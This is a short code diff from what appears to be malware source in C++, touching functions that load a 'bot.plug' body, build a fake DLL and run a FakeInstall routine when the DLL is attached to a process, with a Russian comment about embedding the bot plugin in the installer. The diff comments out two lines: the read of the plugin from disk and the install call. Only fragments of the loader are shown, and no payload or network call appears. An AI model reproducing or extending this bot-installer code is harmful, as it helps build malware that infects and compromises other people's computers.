@@ -407,7 +407,7 @@ LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 // Выделена отдельно, потому что возможно будем встраивать Bot.plug прямо в инсталер.
 LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
 {
-	return File::ReadToBufferA("bot.plug", Size);
+//	return File::ReadToBufferA("bot.plug", Size);
 
 	string PlugName = BotPlugName;
 	STR::AnsiLowerCase(PlugName.t_str());
@@ -638,7 +638,7 @@ DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 	switch (reason)
 	{
 		case DLL_PROCESS_ATTACH:
-			FakeInstall( "bot.plug", 0, 0, 0 );
+//			FakeInstall( "bot.plug", 0, 0, 0 );
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
